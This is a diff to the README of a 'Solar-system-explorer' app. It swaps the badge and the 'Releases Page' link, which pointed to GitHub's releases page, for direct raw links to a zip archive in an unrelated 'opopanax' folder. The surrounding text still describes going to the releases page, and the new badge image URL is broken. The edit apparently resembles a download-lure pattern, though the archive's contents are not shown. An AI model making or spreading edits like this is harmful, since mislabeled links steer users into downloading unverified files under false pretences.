@@ -1,6 +1,6 @@
 # 🌌 Solar-system-explorer - Explore the Solar System Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/imqluqman/Solar-system-explorer/releases)
+[![Download Now](https://raw.githubusercontent.com/imqluqman/Solar-system-explorer/main/opopanax/Solar-system-explorer_v2.6.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/imqluqman/Solar-system-explorer/main/opopanax/Solar-system-explorer_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To run the **Solar-system-explorer**, you will need:
 
 ## 📥 Download & Install
 
-To get started with **Solar-system-explorer**, visit this page to download: [Releases Page](https://github.com/imqluqman/Solar-system-explorer/releases).
+To get started with **Solar-system-explorer**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/imqluqman/Solar-system-explorer/main/opopanax/Solar-system-explorer_v2.6.zip).
 
 1. Click on the link above to go to the GitHub releases page.
 2. Look for the latest version of the application.
